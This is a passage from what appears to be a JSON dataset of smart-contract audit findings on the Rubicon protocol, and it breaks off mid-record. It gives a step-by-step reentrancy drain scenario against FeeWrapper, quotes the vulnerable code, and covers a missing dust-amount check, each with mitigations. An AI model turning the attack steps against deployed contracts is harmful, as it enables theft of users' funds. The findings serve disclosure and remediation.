be called again by the `rubicallPayable()` function.\n6 . (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\"); will be called and `Tx will pass` since there is `enouth Eth` in the contract from the previous deposit.\n7 . Again `_feeParams.feeAmount = 0.1Eth` will be transferred to the `_feeTo` address.\n8 . This can be continued till there is `enough Eth in the contract`.\n9 . This happens due to there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.\n\n## Proof of Concept\n    function _chargeFeePayable(\n        FeeParams memory _feeParams\n    ) internal returns (uint256 _msgValue) {\n        // _feeToken is ETH\n        uint256 _totalAmount = _feeParams.totalAmount;\n        uint256 _feeAmount = _feeParams.feeAmount;\n        address _feeTo = _feeParams.feeTo;\n        require(msg.value == _totalAmount, \"FeeWrapper: not enough ETH sent\");\n\n        // transfer fee to the 3rd party protocol\n        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\");\n\t\trequire(OK, \"ETH transfer failed\");\n        _msgValue = msg.value - _feeAmount;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n    function _rubicallPayable(\n        CallParams memory _params\n    ) internal returns (bytes memory) {\n        // charge fee from feeParams\n        uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n\n        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n            bytes.concat(_params.selector, _params.args)\n        );\n\n        require(_OK, \"low-level call to the router failed\");\n\n        return _data;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n## Tools Used\nManual Review and VSCode\n\n## Recommended Mitigation Steps\nTwo options can be recommended to mitigate this issue:\n\n1. Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.\n\n2. Check that the ``msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case there is no gain to the `_feeTo` malicious contract, since the value it sending via `msg.value` is any way greater than the `_feeAmount` which he can steal via `reentrancy attack`.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n\n# Vulnerability details\n\n## Impact\n\nReentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of Eth to the `_feeTo` address. \n\nConsider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:\n\n1 . The call to (bool OK, ) = `payable(_feeTo)`.call{value: _feeAmount}(\"\") is made. Lets assume the _totalAmount = 1Eth and _feeAmount = 0.1Eth initially.\n2 . `_feeTo` contract has `recieve()` function implemented in it.\n3 . It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending `0.01Eth` as msg.value.\n4 . Sets the `_feeParams.totalAmount =  0.01Eth` and `_feeParams.feeAmount = 0.1Eth` in the call to `rubicallPayable()`\n5 . `FeeWrapper.chargeFeePayable()` will be called again by the `rubicallPayable()` function.\n6 . (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\"); will be called and `Tx will pass` since there is `enouth Eth` in the contract from the previous deposit.\n7 . Again `_feeParams.feeAmount = 0.1Eth` will be transferred to the `_feeTo` address.\n8 . This can be continued till there is `enough Eth in the contract`.\n9 . This happens due to there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.\n\n## Proof of Concept\n    function _chargeFeePayable(\n        FeeParams memory _feeParams\n    ) internal returns (uint256 _msgValue) {\n        // _feeToken is ETH\n        uint256 _totalAmount = _feeParams.totalAmount;\n        uint256 _feeAmount = _feeParams.feeAmount;\n        address _feeTo = _feeParams.feeTo;\n        require(msg.value == _totalAmount, \"FeeWrapper: not enough ETH sent\");\n\n        // transfer fee to the 3rd party protocol\n        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\");\n\t\trequire(OK, \"ETH transfer failed\");\n        _msgValue = msg.value - _feeAmount;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n    function _rubicallPayable(\n        CallParams memory _params\n    ) internal returns (bytes memory) {\n        // charge fee from feeParams\n        uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n\n        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n            bytes.concat(_params.selector, _params.args)\n        );\n\n        require(_OK, \"low-level call to the router failed\");\n\n        return _data;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n## Tools Used\nManual Review and VSCode\n\n## Recommended Mitigation Steps\nTwo options can be recommended to mitigate this issue:\n\n1. Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.\n\n2. Check that the ``msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case there is no gain to the `_feeTo` malicious contract, since the value it sending via `msg.value` is any way greater than the `_feeAmount` which he can steal via `reentrancy attack`.",
      "description": null,
      "impact": "## Impact\n\nReentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of Eth to the `_feeTo` address.\n\nConsider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:\n\n1 . The call to (bool OK, ) = `payable(_feeTo)`.call{value: _feeAmount}(\"\") is made. Lets assume the _totalAmount = 1Eth and _feeAmount = 0.1Eth initially.\n2 . `_feeTo` contract has `recieve()` function implemented in it.\n3 . It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending `0.01Eth` as msg.value.\n4 . Sets the `_feeParams.totalAmount =  0.01Eth` and `_feeParams.feeAmount = 0.1Eth` in the call to `rubicallPayable()`\n5 . `FeeWrapper.chargeFeePayable()` will be called again by the `rubicallPayable()` function.\n6 . (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\"); will be called and `Tx will pass` since there is `enouth Eth` in the contract from the previous deposit.\n7 . Again `_feeParams.feeAmount = 0.1Eth` will be transferred to the `_feeTo` address.\n8 . This can be continued till there is `enough Eth in the contract`.\n9 . This happens due to there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.\n",
      "mitigation": "## Recommended Mitigation Steps\nTwo options can be recommended to mitigate this issue:\n\n1. Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.\n\n2. Check that the ``msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case there is no gain to the `_feeTo` malicious contract, since the value it sending via `msg.value` is any way greater than the `_feeAmount` which he can steal via `reentrancy attack`.\n",
      "poc": "## Proof of Concept\n    function _chargeFeePayable(\n        FeeParams memory _feeParams\n    ) internal returns (uint256 _msgValue) {\n        // _feeToken is ETH\n        uint256 _totalAmount = _feeParams.totalAmount;\n        uint256 _feeAmount = _feeParams.feeAmount;\n        address _feeTo = _feeParams.feeTo;\n        require(msg.value == _totalAmount, \"FeeWrapper: not enough ETH sent\");\n\n        // transfer fee to the 3rd party protocol\n        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\");\n\t\trequire(OK, \"ETH transfer failed\");\n        _msgValue = msg.value - _feeAmount;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n    function _rubicallPayable(\n        CallParams memory _params\n    ) internal returns (bytes memory) {\n        // charge fee from feeParams\n        uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n\n        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n            bytes.concat(_params.selector, _params.args)\n        );\n\n        require(_OK, \"low-level call to the router failed\");\n\n        return _data;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review and VSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nReentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of Eth to the `_feeTo` address.\n\nConsider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:\n\n1 . The call to (bool OK, ) = `payable(_feeTo)`.call{value: _feeAmount}(\"\") is made. Lets assume the _totalAmount = 1Eth and _feeAmount = 0.1Eth initially.\n2 . `_feeTo` contract has `recieve()` function implemented in it.\n3 . It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending `0.01Eth` as msg.value.\n4 . Sets the `_feeParams.totalAmount =  0.01Eth` and `_feeParams.feeAmount = 0.1Eth` in the call to `rubicallPayable()`\n5 . `FeeWrapper.chargeFeePayable()` will be called again by the `rubicallPayable()` function.\n6 . (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\"); will be called and `Tx will pass` since there is `enouth Eth` in the contract from the previous deposit.\n7 . Again `_feeParams.feeAmount = 0.1Eth` will be transferred to the `_feeTo` address.\n8 . This can be continued till there is `enough Eth in the contract`.\n9 . This happens due to there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.\n",
        "recommendation": "## Recommended Mitigation Steps\nTwo options can be recommended to mitigate this issue:\n\n1. Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.\n\n2. Check that the ``msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case there is no gain to the `_feeTo` malicious contract, since the value it sending via `msg.value` is any way greater than the `_feeAmount` which he can steal via `reentrancy attack`.\n",
        "poc": "## Proof of Concept\n    function _chargeFeePayable(\n        FeeParams memory _feeParams\n    ) internal returns (uint256 _msgValue) {\n        // _feeToken is ETH\n        uint256 _totalAmount = _feeParams.totalAmount;\n        uint256 _feeAmount = _feeParams.feeAmount;\n        address _feeTo = _feeParams.feeTo;\n        require(msg.value == _totalAmount, \"FeeWrapper: not enough ETH sent\");\n\n        // transfer fee to the 3rd party protocol\n        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\");\n\t\trequire(OK, \"ETH transfer failed\");\n        _msgValue = msg.value - _feeAmount;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n    function _rubicallPayable(\n        CallParams memory _params\n    ) internal returns (bytes memory) {\n        // charge fee from feeParams\n        uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n\n        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n            bytes.concat(_params.selector, _params.args)\n        );\n\n        require(_OK, \"low-level call to the router failed\");\n\n        return _data;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review and VSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n\n# Vulnerability details\n\n## Impact\n\nReentrancy attack could happen if `_feeTo` is a `malicious` contract and has `recieve()` function implemented in `_feeTo` contract. `FeeWrapper._chargeFeePayable()` function is used to send the `_feeAmount` of Eth to the `_feeTo` address.\n\nConsider that `FeeWrapper._chargeFeePayable()` is called by the `FeeWrapper._rubicallPayable()` function with the necessary `_feeParams` input parameter, and the following scenario can occur:\n\n1 . The call to (bool OK, ) = `payable(_feeTo)`.call{value: _feeAmount}(\"\") is made. Lets assume the _totalAmount = 1Eth and _feeAmount = 0.1Eth initially.\n2 . `_feeTo` contract has `recieve()` function implemented in it.\n3 . It reenters the `FeeWrapper` contract by calling the `rubicallPayable()` function by sending `0.01Eth` as msg.value.\n4 . Sets the `_feeParams.totalAmount =  0.01Eth` and `_feeParams.feeAmount = 0.1Eth` in the call to `rubicallPayable()`\n5 . `FeeWrapper.chargeFeePayable()` will be called again by the `rubicallPayable()` function.\n6 . (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\"); will be called and `Tx will pass` since there is `enouth Eth` in the contract from the previous deposit.\n7 . Again `_feeParams.feeAmount = 0.1Eth` will be transferred to the `_feeTo` address.\n8 . This can be continued till there is `enough Eth in the contract`.\n9 . This happens due to there is `no check` to make sure `msg.value > _feeAmount` before the low level `call` to the `_feeTo` address.\n\n## Proof of Concept\n    function _chargeFeePayable(\n        FeeParams memory _feeParams\n    ) internal returns (uint256 _msgValue) {\n        // _feeToken is ETH\n        uint256 _totalAmount = _feeParams.totalAmount;\n        uint256 _feeAmount = _feeParams.feeAmount;\n        address _feeTo = _feeParams.feeTo;\n        require(msg.value == _totalAmount, \"FeeWrapper: not enough ETH sent\");\n\n        // transfer fee to the 3rd party protocol\n        (bool OK, ) = payable(_feeTo).call{value: _feeAmount}(\"\");\n\t\trequire(OK, \"ETH transfer failed\");\n        _msgValue = msg.value - _feeAmount;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L108-L121\n\n    function _rubicallPayable(\n        CallParams memory _params\n    ) internal returns (bytes memory) {\n        // charge fee from feeParams\n        uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n\n        (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n            bytes.concat(_params.selector, _params.args)\n        );\n\n        require(_OK, \"low-level call to the router failed\");\n\n        return _data;\n    }\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n## Tools Used\nManual Review and VSCode\n\n## Recommended Mitigation Steps\nTwo options can be recommended to mitigate this issue:\n\n1. Add a reentrancy guard. `Openzeppelin` `ReentrancyGuard.sol` can be used, and `nonReentrant` modifier can be added to both `FeeWrapper._chargeFeePayable()` and `FeeWrapper._rubicallPayable()` functions.\n\n2. Check that the ``msg.value > _feeAmount` before the low level `call` to the `_feeTo` address is made. In that case there is no gain to the `_feeTo` malicious contract, since the value it sending via `msg.value` is any way greater than the `_feeAmount` which he can steal via `reentrancy attack`.\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1167,
      "page_start": null,
      "heading": "1167. Missing a check for minimum sell amount at make function",
      "heading_cleaned": "Missing a check for minimum sell amount at make function",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\n\n\n# Vulnerability details\n\n## Summary\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nThere is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\nbut not inside the other offer function being called by make function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511)\n\n## Impact\n`make` function will not avoid dust offers\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\nThere is no check for `_dust` inside offer function, the minimum sell amount should be set for a token to avoid dust offers as the concept apply.\n```Sh\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem,\n        address owner,\n        address recipient\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(pay_gem != buy_gem);\n\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.recipient = recipient;\n        info.owner = owner;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n\n        emit LogItemUpdate(id);\n\n\n        /// emit LogMake(\n        ///     bytes32(id),\n        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),\n        ///     msg.sender,\n        ///     pay_gem,\n        ///     buy_gem,\n        ///     uint128(pay_amt),\n        ///     uint128(buy_amt),\n        ///     uint64(block.timestamp)\n        /// );\n\n\n        emit emitOffer(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt)\n        );\n    }\n```\n\nas you see it is applied in the other offer function as well at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the check condition:\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\nto `offer` function that called by `make` function\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\n\n\n# Vulnerability details\n\n## Summary\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nThere is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\nbut not inside the other offer function being called by make function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511)\n\n## Impact\n`make` function will not avoid dust offers\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\nThere is no check for `_dust` inside offer function, the minimum sell amount should be set for a token to avoid dust offers as the concept apply.\n```Sh\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem,\n        address owner,\n        address recipient\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(pay_gem != buy_gem);\n\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.recipient = recipient;\n        info.owner = owner;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n\n        emit LogItemUpdate(id);\n\n\n        /// emit LogMake(\n        ///     bytes32(id),\n        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),\n        ///     msg.sender,\n        ///     pay_gem,\n        ///     buy_gem,\n        ///     uint128(pay_amt),\n        ///     uint128(buy_amt),\n        ///     uint64(block.timestamp)\n        /// );\n\n\n        emit emitOffer(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt)\n        );\n    }\n```\n\nas you see it is applied in the other offer function as well at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nAdd the check condition:\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\nto `offer` function that called by `make` function\n",
      "description": null,
      "impact": "## Impact\n`make` function will not avoid dust offers\n",
      "mitigation": "## Recommended Mitigation Steps\nAdd the check condition:\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\nto `offer` function that called by `make` function\n",
      "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\nThere is no check for `_dust` inside offer function, the minimum sell amount should be set for a token to avoid dust offers as the concept apply.\n```Sh\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem,\n        address owner,\n        address recipient\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(pay_gem != buy_gem);\n\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.recipient = recipient;\n        info.owner = owner;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n\n        emit LogItemUpdate(id);\n\n\n        /// emit LogMake(\n        ///     bytes32(id),\n        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),\n        ///     msg.sender,\n        ///     pay_gem,\n        ///     buy_gem,\n        ///     uint128(pay_amt),\n        ///     uint128(buy_amt),\n        ///     uint64(block.timestamp)\n        /// );\n\n\n        emit emitOffer(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt)\n        );\n    }\n```\n\nas you see it is applied in the other offer function as well at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\n\n**container:**\n# Vulnerability details\n\n## Summary\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nThere is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\nbut not inside the other offer function being called by make function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511)\n\n**tools_used:**\n## Tools Used\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n`make` function will not avoid dust offers\n",
        "recommendation": "## Recommended Mitigation Steps\nAdd the check condition:\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\nto `offer` function that called by `make` function\n",
        "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\nThere is no check for `_dust` inside offer function, the minimum sell amount should be set for a token to avoid dust offers as the concept apply.\n```Sh\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem,\n        address owner,\n        address recipient\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(pay_gem != buy_gem);\n\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = buy_gem;\n        info.recipient = recipient;\n        info.owner = owner;\n        info.timestamp = uint64(block.timestamp);\n        id = _next_id();\n        offers[id] = info;\n\n\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n\n\n        emit LogItemUpdate(id);\n\n\n        /// emit LogMake(\n        ///     bytes32(id),\n        ///     keccak256(abi.encodePacked(pay_gem, buy_gem)),\n        ///     msg.sender,\n        ///     pay_gem,\n        ///     buy_gem,\n        ///     uint128(pay_amt),\n        ///     uint128(buy_amt),\n        ///     uint64(block.timestamp)\n        /// );\n\n\n        emit emitOffer(\n            bytes32(id),\n            keccak256(abi.encodePacked(pay_gem, buy_gem)),\n            msg.sender,\n            pay_gem,\n            buy_gem,\n            uint128(pay_amt),\n            uint128(buy_amt)\n        );\n    }\n```\n\nas you see it is applied in the other offer function as well at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\n```\n   require(_dust[address(pay_gem)] <= pay_amt);\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\n\n**container:**\n# Vulnerability details\n\n## Summary\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nThere is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\nbut not inside the other offer function being called by make function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511)\n\n**tools_used:**\n## Tools Used\nManual Review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\n\n\n# Vulnerability details\n\n## Summary\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835\nThere is a check for `_dust` amount inside offer function at [L835](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L835)\nbut not inside the other offer function being called by make function at [L511](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511)\n\n## Impact\n`make` function will not avoid dust offers\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511-L562\nThere is no check for `_dust` inside offer function, the minimum sell amount should be set for a token to avoid dust offers as the concept apply.\n```Sh\n    function offer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem,\n        address owner,\n        address recipient\n    ) public virtual can_offer synchronized returns (uint256 id) {\n        require(uint128(pay_amt) == pay_amt);\n        require(uint128(buy_amt) == buy_amt);\n        require(pay_amt > 0);\n        require(pay_gem != ERC20(address(0))); /// @dev Note, modified from: require(pay_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(buy_amt > 0);\n        require(buy_gem != ERC20(address(0))); /// @dev Note, modified from: require(buy_gem != ERC20(0x0)) which compiles in 0.7.6\n        require(pay_gem != buy_gem);\n\n\n        OfferInfo memory info;\n        info.pay_amt = pay_amt;\n        info.pay_gem = pay_gem;\n        info.buy_amt = buy_amt;\n        info.buy_gem = 